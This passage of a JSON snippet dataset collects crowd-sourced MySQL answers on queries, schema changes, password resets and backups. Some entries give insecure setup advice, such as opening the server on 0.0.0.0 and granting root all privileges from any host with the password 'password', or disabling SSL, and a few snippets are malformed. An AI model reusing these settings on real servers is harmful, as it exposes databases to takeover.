    "description": "select replace(replace(replace(col, '$', ''), '&pound;', ''), 'n/a', '')\n",
    "reg_date": "2021-10-12T09:56:46.000Z"
  },
  {
    "id": 1887,
    "keyword": null,
    "link": null,
    "title": " multiple where condition in sql",
    "description": "SELECT CASE col1 \tWHEN 'agree' THEN 'Ok' \tWHEN 'disagree' THEN 'Ko'     ELSE         CASE              WHEN col2 >= 1 THEN 'Ko'             ELSE 'Maybe'         END END AS my_result FROM table_name;\nSELECT * FROM suppliers WHERE (state = 'California' AND supplier_id <> 900) OR (supplier_id = 100);\nSELECT items.* FROM items i, meta_data m1, meta_data m2     WHERE i.item_id = m1.item_id and i.item_id = m2.item_id     AND m1.meta_key = 'lat' AND m1.meta_value >= 55 AND m1.meta_value <= 65     AND m2.meta_key = 'lng' AND m2.meta_value >= 20 AND m2.meta_value <= 30\nSQL> SELECT ID, NAME, SALARY  FROM CUSTOMERS WHERE SALARY > 2000 OR age < 25;\n+----+----------+----------+ | ID | NAME     | SALARY   | +----+----------+----------+ |  3 | kaushik  |  2000.00 | |  4 | Chaitali |  6500.00 | |  5 | Hardik   |  8500.00 | |  6 | Komal    |  4500.00 | |  7 | Muffy    | 10000.00 | +----+----------+----------+ \n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1888,
    "keyword": null,
    "link": null,
    "title": " my sql selsct db",
    "description": "USE database_name;\n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1889,
    "keyword": null,
    "link": null,
    "title": " my sql version",
    "description": "# Console: mysql -V mysql --version # Query: SHOW VARIABLES LIKE \"%version%\"; # PHPMyAdmin Interface, on the right side: > Database server > Server version\n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1890,
    "keyword": null,
    "link": null,
    "title": " myql find duplicates",
    "description": "SELECT      col,      COUNT(col) FROM     table_name GROUP BY col HAVING COUNT(col) > 1; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1891,
    "keyword": null,
    "link": null,
    "title": " myql insert from select",
    "description": "INSERT INTO table_name(column_list) SELECT     select_list  FROM     another_table WHERE    condition;\n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1892,
    "keyword": null,
    "link": null,
    "title": " mysql' is not recognized as an internal or external command,",
    "description": "Simply type in command prompt :  set path=%PATH%;D:\\xampp\\mysql\\bin;  Here I have used path started from D so I used D: , you can use C: or E: \n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1893,
    "keyword": null,
    "link": null,
    "title": " mysql: command not found",
    "description": "export PATH=$PATH:/usr/local/mysql/bin/\nCommand not found error shown when the mysql.exe path is not set in environmental variables as PATH or you do this by set the path from cmd  1. open cmd 2. set mysql path in cmd >set path=c:\\wamp\\bin\\mysql\\mysql5.6.17\\bin  Now you can check mysql commands\n/usr/local/mysql/bin\n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1894,
    "keyword": null,
    "link": null,
    "title": " mysql #1093 - You can't specify target table error",
    "description": "DELETE FROM story_category WHERE category_id NOT IN (     SELECT cid FROM (         SELECT DISTINCT category.id AS cid FROM category          INNER JOIN story_category ON category_id=category.id     ) AS c )\n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1895,
    "keyword": null,
    "link": null,
    "title": " mysql 1 day ago",
    "description": "select *  from orders  where order_date >= DATE_SUB(NOW(),INTERVAL 1 YEAR);\nSELECT * FROM FOO WHERE MY_DATE_FIELD >= NOW() - INTERVAL 1 DAY\n",
    "reg_date": "2021-10-12T09:56:47.000Z"
  },
  {
    "id": 1896,
    "keyword": null,
    "link": null,
    "title": " mysql 1 hour ago",
    "description": "DELETE FROM wp_posts  WHERE post_date < DATE_SUB(NOW(), INTERVAL 1 HOUR)    AND post_status = 'publish' \n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1897,
    "keyword": null,
    "link": null,
    "title": " mysql 3 months ago",
    "description": "date_created >= NOW() - INTERVAL 3 MONTH\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1898,
    "keyword": null,
    "link": null,
    "title": " mysql 5.6 hierarchical recursive query",
    "description": "select  id,         name,         parent_id  from    (select * from products          order by parent_id, id) products_sorted,         (select @pv := '19') initialisation where   find_in_set(parent_id, @pv) and     length(@pv := concat(@pv, ',', id))\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1899,
    "keyword": null,
    "link": null,
    "title": " mysql 5.7 in centos 7",
    "description": "$ wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1900,
    "keyword": null,
    "link": null,
    "title": " mysql 5.7 install ubuntu",
    "description": "Installing MySQL 5.7 on Ubuntu 20.04 (Focal Fossa) Step 1: Add MySQL APT repository in Ubuntu. ... Step 2: Update MySQL Repository on Ubuntu. ... Step 3: Install MySQL 5.7 on Ubuntu 20.04 Linux machine. ... Step 3: Secure MySQL 5.7 Installation on Ubuntu 20.04. ... Check MySQL version. ... Step 4: Create MySQL User (Optional, testing only)\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1901,
    "keyword": null,
    "link": null,
    "title": " mysql 8 geo to json",
    "description": "// second argument is max decimal degits mysql> SELECT ST_AsGeoJSON(ST_GeomFromText('POINT(11.11111 12.22222)'),2);  +-------------------------------------------------------------+ | ST_AsGeoJSON(ST_GeomFromText('POINT(11.11111 12.22222)'),2) | +-------------------------------------------------------------+ | {\"type\": \"Point\", \"coordinates\": [11.11, 12.22]}            | +-------------------------------------------------------------+\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1902,
    "keyword": null,
    "link": null,
    "title": " mysql CURRENT TIMESTAMP()",
    "description": "CURRENT_TIMESTAMP()\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1903,
    "keyword": null,
    "link": null,
    "title": " mysql Can't create/write to file '/home/results.csv' (Errcode: 13 \"Permission denied\")",
    "description": "-- If you are using linux,  SELECT id, filename INTO OUTFILE '/tmp/results.csv' FROM attachments -- and find the csv file /tmp\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1904,
    "keyword": null,
    "link": null,
    "title": " mysql HAVING",
    "description": "SELECT      ordernumber,     SUM(quantityOrdered) AS itemsCount,     SUM(priceeach*quantityOrdered) AS total FROM     orderdetails GROUP BY     ordernumber HAVING     total > 1000;\nSELECT colonne1, SUM(colonne2) FROM nom_table GROUP BY colonne1 HAVING fonction(colonne2) operateur valeur\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1905,
    "keyword": null,
    "link": null,
    "title": " mysql Incorrect column specifier for column",
    "description": "Possible Solution:  \tMake sure if you are using something like varchar,      to turn off 'Auto Increment'\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1906,
    "keyword": null,
    "link": null,
    "title": " mysql Public Key Retrieval is not allowed",
    "description": "jdbc:mysql://localhost:3306/db?allowPublicKeyRetrieval=true&useSSL=false \nallowPublicKeyRetrieval=true\nMYSQL DB CONNECTION ERROR\n",
    "reg_date": "2021-10-12T09:56:48.000Z"
  },
  {
    "id": 1907,
    "keyword": null,
    "link": null,
    "title": " mysql UPDate with enner join",
    "description": "UPDATE T1, T2, [INNER JOIN | LEFT JOIN] T1 ON T1.C1 = T2. C1 SET T1.C2 = T2.C2,      T2.C3 = expr WHERE condition \n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1908,
    "keyword": null,
    "link": null,
    "title": " mysql access denied for user 'root'@'localhost'",
    "description": "sudo mysql  ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root'; \nUPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES;\nUPDATE mysql.user SET plugin = 'mysql_native_password' WHERE user = 'root' AND plugin = 'unix_socket'; FLUSH PRIVILEGES; \n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!\nsudo /etc/init.d/mysql stop  Now start up MySQL in safe mode, so you&rsquo;ll skip the privileges table:  sudo mysqld_safe --skip-grant-tables &     // if you face issue,[mysqld_safe Directory '/var/run/mysqld' for UNIX socket file don't exists] run below commands] start         mkdir -p /var/run/mysqld         chown mysql:mysql /var/run/mysqld     // end   Login with root: mysql -uroot   And assign the DB that needs to be used: use mysql;  SHOW VARIABLES LIKE 'sql_mode'; SET sql_mode = '';  SET PASSWORD FOR root = 'Dehr@dun@345';\t// it is working     update user set password=PASSWORD(\"YOURPASSWORDHERE\") where User='root';         [On MySql 5.7 version you must replace query to:]          update user set authentication_string=PASSWORD(\"YOURPASSWORDHERE\") where user=\"root\";    flush privileges;  quit  sudo /etc/init.d/mysql stop sudo /etc/init.d/mysql start  Now your root password should be working with the one you just set, check it with: mysql -u root -p \nALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'insert_password';\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1909,
    "keyword": null,
    "link": null,
    "title": " mysql add 2 hours",
    "description": "SELECT *  FROM courses  WHERE DATE_ADD(NOW(), INTERVAL 2 HOUR) > start_time\nDATE_ADD(NOW(), INTERVAL 2 HOUR)\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1910,
    "keyword": null,
    "link": null,
    "title": " mysql add column",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE Table_name ADD Email varchar(255);\nALTER TABLE Table_name ADD name_column INT(255);\nALTER TABLE `TABLE_NAME`  \tADD `COLUMN_NAME` VARCHAR(50) NULL     AFTER `COLUMN_NAME_AFTER`;\nALTER TABLE table_name ADD [COLUMN] column_name column_definition [FIRST|AFTER existing_column];\n-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1911,
    "keyword": null,
    "link": null,
    "title": " mysql add column after another",
    "description": "-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\nALTER TABLE table   ADD [COLUMN] column_name column_definition   [FIRST|AFTER existing_column];\nALTER TABLE table ADD [COLUMN] column_name column_definition [FIRST|AFTER existing_column];\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1912,
    "keyword": null,
    "link": null,
    "title": " mysql add column default value",
    "description": "ALTER TABLE table1 ADD COLUMN foo INT DEFAULT 0;\n-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1913,
    "keyword": null,
    "link": null,
    "title": " mysql add column to table",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE Table_name ADD Email varchar(255);\nALTER TABLE Table_name ADD name_column INT(255);\nALTER TABLE `TABLE_NAME`  \tADD `COLUMN_NAME` VARCHAR(50) NULL     AFTER `COLUMN_NAME_AFTER`;\nALTER TABLE contacts   ADD last_name varchar(40) NOT NULL     AFTER contact_id;\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1914,
    "keyword": null,
    "link": null,
    "title": " mysql add column with default value",
    "description": "ALTER TABLE table1 ADD COLUMN foo INT DEFAULT 0;\n-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1915,
    "keyword": null,
    "link": null,
    "title": " mysql add columns",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\n-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\nALTER TABLE table ADD [COLUMN] column_name_1 column_1_definition [FIRST|AFTER existing_column], ADD [COLUMN] column_name_2 column_2_definition [FIRST|AFTER existing_column], ... ;\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1916,
    "keyword": null,
    "link": null,
    "title": " mysql add comment to column",
    "description": "ALTER TABLE `user` CHANGE `id` `id` INT( 11 ) COMMENT 'id of user';\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1917,
    "keyword": null,
    "link": null,
    "title": " mysql add days to date",
    "description": "UPDATE classes  SET `date` = DATE_ADD(`date`, INTERVAL 2 DAY) WHERE id = 161\nUPDATE classes  SET `date` = DATE_ADD(`date` , INTERVAL 2 DAY) WHERE `id` = 161;\n",
    "reg_date": "2021-10-12T09:56:49.000Z"
  },
  {
    "id": 1918,
    "keyword": null,
    "link": null,
    "title": " mysql add foreign key",
    "description": "ALTER TABLE orders ADD  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE; \nALTER TABLE table_name DROP CONSTRAINT fk_name;\n-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nCREATE TABLE parent (     id INT NOT NULL,     PRIMARY KEY (id) ) ENGINE=INNODB;  CREATE TABLE child (     id INT,     parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)         REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\n                                     CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT NOT NULL,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)      REFERENCES categories(categoryId)         ON UPDATE CASCADE         ON DELETE CASCADE ) ENGINE=INNODB;\nINSERT INTO joke(joke_text, joke_date, author_id) VALUES (&lsquo;Humpty Dumpty had a great fall.&rsquo;, &lsquo;1899&ndash;03&ndash;13&rsquo;,          (SELECT id FROM author WHERE author_name = &lsquo;Famous Anthony&rsquo;));\n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1919,
    "keyword": null,
    "link": null,
    "title": " mysql add root password",
    "description": "cd \"C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin\"  C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin> mysql -u root -p Enter password: *********  mysql> ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'newrootpassword'; Query OK, 0 rows affected (0.10 sec)  mysql> exit \nALTER USER 'username' IDENTIFIED WITH mysql_native_password BY 'password'; \n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1920,
    "keyword": null,
    "link": null,
    "title": " mysql add text to existing field",
    "description": "UPDATE categories SET code = CONCAT(code, '_standard') WHERE id = 1; \n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1921,
    "keyword": null,
    "link": null,
    "title": " mysql add to number",
    "description": "UPDATE user SET points = points + 1 WHERE id = 42\n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1922,
    "keyword": null,
    "link": null,
    "title": " mysql add to value",
    "description": "UPDATE addingValueToExisting SET GameScore = GameScore+10 WHERE Id = 4; \n<?php $con = mysql_connect(\"localhost\",\"peter\",\"abc123\"); if (!$con)   {   die('Could not connect: ' . mysql_error());   }  mysql_select_db(\"my_db\", $con);  mysql_query(\"UPDATE `some_table` SET `value` = `value` + 1000 WHERE `id` = 1\");  mysql_close($con); ?> \n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1923,
    "keyword": null,
    "link": null,
    "title": " mysql add user with all privileges",
    "description": "CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost'; FLUSH PRIVILEGES;\n# First Login mysql shell.. sudo mysql -u root -p  CREATE USER 'username'@'localhost' IDENTIFIED BY 'P4ssW0rd'; GRANT ALL PRIVILEGES ON *.* TO 'username'@'localhost'; FLUSH PRIVILEGES;\nCREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password'; \n## ADD user in mysql && have problem with root user ##  # First Login mysql shell.. sudo mysql -u root -p   ## Also check if you are unable to login in mysql without sudo...  ## Creating new user and giving permissions... # Goto login shell of mysql... and type below commands...  #1 show databases; #2 use mysql; #3 select user, host, plugin from mysql.user; #4 create user 'your_user_name'@'localhost' identified by 'password'; #5 grant all privileges on *.* to 'your_user_name'@'localhost'; #6 update user set plugin=\"caching_sha2_password\" where User=\"your_user_name\"; \t#     .... Here caching_sha2_password you can see yours in #3 check  \t#\t\tyour table and see column (plugin) don't use root plugin... #7 flush privileges; #8 EXIT  #### DONE Now you created your user also you can user without sudo...  mysql -u your_user_name -p  ## For password check your step #4 and enter same password...  ## Enjoy ALL DONE.... ## HAVE A NICE DAY!\n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1924,
    "keyword": null,
    "link": null,
    "title": " mysql admin u root p password change password",
    "description": "#First Login with administrative account (Even root itself)  mysql> use mysql; mysql> SET PASSWORD FOR 'root'@'localhost' = PASSWORD(\"NewPassword\"); mysql> flush privileges;  #Now quit and login mysql> quit  mysql -u root -p #Click enter and It will prompt you to enter password #Just to be safe you should also still try to log in without entering a password\n#Change or update mysql root password #Go to win cmd and cd into C:\\Program Files\\MySQL\\MySQL Server 8.0\\bin #Then type in the following: (password - current root password) mysqladmin -u root -p password newpass\n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1925,
    "keyword": null,
    "link": null,
    "title": " mysql all columns",
    "description": "SHOW COLUMNS FROM mydb.mytable;\n-- MySQL SELECT *  FROM INFORMATION_SCHEMA.COLUMNS;\n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1926,
    "keyword": null,
    "link": null,
    "title": " mysql allow remote connections",
    "description": "#open /etc/mysql/mysql.conf.d/mysqld.cnf  #and change #bind-address            = 127.0.0.1 #to #bind-address            = 0.0.0.0  #then grant root all privaleges to root GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION; FLUSH PRIVILEGES;  #If you ran above command and accidently #did not change password for root you can run this: ALTER USER 'root'@'%' IDENTIFIED BY 'MyNewPass';\nRENAME USER 'sammy'@'localhost' TO 'sammy'@'remote_server_ip'; \n",
    "reg_date": "2021-10-12T09:56:50.000Z"
  },
  {
    "id": 1927,
    "keyword": null,
    "link": null,
    "title": " mysql alter add foreign key",
    "description": "                                     CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT NOT NULL,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)      REFERENCES categories(categoryId)         ON UPDATE CASCADE         ON DELETE CASCADE ) ENGINE=INNODB;\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\nALTER TABLE ordenes ADD ticket VARCHAR(50) NOT NULL; ALTER TABLE ordenes ADD CONSTRAINT fk_ticket FOREIGN KEY (ticket) REFERENCES tickets(ticket); // I'm Horrible Hyena\nALTER TABLE ordenes ADD ticket VARCHAR(50) NOT NULL; ALTER TABLE ordenes ADD CONSTRAINT fk_ticket FOREIGN KEY (ticket) REFERENCES tickets(ticket); \n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1928,
    "keyword": null,
    "link": null,
    "title": " mysql alter decimal precision",
    "description": "ALTER TABLE YourTableNameHere MODIFY COLUMN YourColumnNameHere decimal(4,2)\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1929,
    "keyword": null,
    "link": null,
    "title": " mysql alter table add column",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE Table_name ADD Email varchar(255);\nALTER TABLE Table_name ADD name_column INT(255);\nALTER TABLE `TABLE_NAME`  \tADD `COLUMN_NAME` VARCHAR(50) NULL     AFTER `COLUMN_NAME_AFTER`;\nALTER TABLE table   ADD [COLUMN] column_name column_definition   [FIRST|AFTER existing_column];\nALTER TABLE table ADD [COLUMN] column_name column_definition [FIRST|AFTER existing_column];\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1930,
    "keyword": null,
    "link": null,
    "title": " mysql alter table add column first",
    "description": "ALTER TABLE vendors ADD COLUMN phone VARCHAR(15) AFTER name;\nALTER TABLE Table_name ADD Email varchar(255);\nALTER TABLE `TABLE_NAME`  \tADD `COLUMN_NAME` VARCHAR(50) NULL     AFTER `COLUMN_NAME_AFTER`;\n-- ALTER TABLE tbl_name ADD COLUMN column_name column_definition  --\t\t[FIRST|AFTER existing_column]; ALTER TABLE office ADD COLUMN phone VARCHAR(200) DEFAULT '000' AFTER name; ALTER TABLE office ADD COLUMN flag INT(1) FIRST; ALTER TABLE office ADD COLUMN last_col INT(2);\t-- Last column is default position -- &darr; Test it (Fiddle)\nALTER TABLE table   ADD [COLUMN] column_name column_definition   [FIRST|AFTER existing_column];\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1931,
    "keyword": null,
    "link": null,
    "title": " mysql alter table add index",
    "description": "ALTER TABLE TABLE_NAME ADD INDEX `index_name` (`column_name`) \n# index_name will identify your index for future reference CREATE INDEX index_name ON table_name (column_name);\ncreate index your_index_name on your_table_name(your_column_name) using HASH; or create index your_index_name on your_table_name(your_column_name) using BTREE;\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1932,
    "keyword": null,
    "link": null,
    "title": " mysql alter table set column unique",
    "description": "ALTER TABLE mytbl ADD UNIQUE (columnName);\nALTER TABLE contacts ADD CONSTRAINT contacts_unique UNIQUE (reference_number);\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1933,
    "keyword": null,
    "link": null,
    "title": " mysql application.properties spring boot",
    "description": "spring.jpa.hibernate.ddl-auto=update spring.datasource.url=jdbc:mysql://${MYSQL_HOST:localhost}:3306/db_example spring.datasource.username=springuser spring.datasource.password=ThePasswordCopy\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1934,
    "keyword": null,
    "link": null,
    "title": " mysql auto increment after delete",
    "description": "ALTER TABLE `Table Name` AUTO_INCREMENT = 1;\nSET  @num := 0;  UPDATE your_table SET id = @num := (@num+1);  ALTER TABLE your_table AUTO_INCREMENT =1;\nset @autoid :=0;  update Table_Name set AutoIncremented_Column = @autoid := (@autoid+1); alter table Table_Name Auto_Increment = 1;  @Zenonymous\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1935,
    "keyword": null,
    "link": null,
    "title": " mysql autoincrement valor inicial",
    "description": "ALTER TABLE users AUTO_INCREMENT=50;\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1936,
    "keyword": null,
    "link": null,
    "title": " mysql average of multiple columns",
    "description": "SELECT avg(col1 + col2) FROM test WHERE uid=5;\n",
    "reg_date": "2021-10-12T09:56:51.000Z"
  },
  {
    "id": 1937,
    "keyword": null,
    "link": null,
    "title": " mysql backup certain tables",
    "description": "-- If you are dumping tables t1, t2, and t3 from mydb  mysqldump -u... -p... mydb t1 t2 t3 > mydb_tables.sql  /* If you have a ton of tables in mydb and you want to dump everything  --except t1, t2, and t3, do this: */  DBTODUMP=mydb SQL=\"SET group_concat_max_len = 10240;\" SQL=\"${SQL} SELECT GROUP_CONCAT(table_name separator ' ')\" SQL=\"${SQL} FROM information_schema.tables WHERE table_schema='${DBTODUMP}'\" SQL=\"${SQL} AND table_name NOT IN ('t1','t2','t3')\" TBLIST=`mysql -u... -p... -AN -e\"${SQL}\"` mysqldump -u... -p... ${DBTODUMP} ${TBLIST} > mydb_tables.sql\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1938,
    "keyword": null,
    "link": null,
    "title": " mysql backup database",
    "description": "mysql -u [user] -p [database_name] < [filename].sql\n#Take backup of database mysqldump database > backup-file.sql;   #Restore database mysql database < backup-file.sql;\nmysqldump db_name table_name >  table_backup.sql\nmysqldump database_name > database_name.sql\nfind . -name '*.sql' | awk '{ print \"source\",$0 }' | mysql --batc\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1939,
    "keyword": null,
    "link": null,
    "title": " mysql backup database command line",
    "description": "mysqldump -u<user_name> -p<user_password> <database_name> > <file_name>.sql\n#Take backup of database mysqldump database > backup-file.sql;   #Restore database mysql database < backup-file.sql;\nmysqldump database_name > database_name.sql\nmysql -u<user_name> -puser_password> <database_name> source /path/db.sql\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1940,
    "keyword": null,
    "link": null,
    "title": " mysql backup query",
    "description": "#Take backup of database mysqldump database > backup-file.sql;   #Restore database mysql database < backup-file.sql;\nmysqldump db_name table_name >  table_backup.sql\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1941,
    "keyword": null,
    "link": null,
    "title": " mysql backup sh script and remove old",
    "description": "#!/bin/bash   ################################################################ ## ##   MySQL Database Backup Script  ##   Written By: Rahul Kumar ##   URL: https://tecadmin.net/bash-script-mysql-database-backup/ ##   Last Update: Jan 05, 2019 ## ################################################################   export PATH=/bin:/usr/bin:/usr/local/bin TODAY=`date +\"%d%b%Y\"`   ################################################################ ################## Update below values  ########################   DB_BACKUP_PATH='/backup/dbbackup' MYSQL_HOST='localhost' MYSQL_PORT='3306' MYSQL_USER='root' MYSQL_PASSWORD='mysecret' DATABASE_NAME='mydb' BACKUP_RETAIN_DAYS=30   ## Number of days to keep local backup copy   #################################################################   mkdir -p ${DB_BACKUP_PATH}/${TODAY} echo \"Backup started for database - ${DATABASE_NAME}\"     mysqldump -h ${MYSQL_HOST} \\    -P ${MYSQL_PORT} \\    -u ${MYSQL_USER} \\    -p${MYSQL_PASSWORD} \\    ${DATABASE_NAME} | gzip > ${DB_BACKUP_PATH}/${TODAY}/${DATABASE_NAME}-${TODAY}.sql.gz   if [ $? -eq 0 ]; then   echo \"Database backup successfully completed\" else   echo \"Error found during backup\"   exit 1 fi     ##### Remove backups older than {BACKUP_RETAIN_DAYS} days  #####   DBDELDATE=`date +\"%d%b%Y\" --date=\"${BACKUP_RETAIN_DAYS} days ago\"`   if [ ! -z ${DB_BACKUP_PATH} ]; then       cd ${DB_BACKUP_PATH}       if [ ! -z ${DBDELDATE} ] && [ -d ${DBDELDATE} ]; then             rm -rf ${DBDELDATE}       fi fi   ### End of script #### \n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1942,
    "keyword": null,
    "link": null,
    "title": " mysql backup skip table",
    "description": "mysqldump -u testuser -p testdb --ignore-table testdb.table1 --ignore-table testdb.table2 > /tmp/backup_ignored.sql\n",
    "reg_date": "2021-10-12T09:56:52.000Z"
  },
  {
    "id": 1943,
    "keyword": null,
    "link": null,
    "title": " mysql backup table",
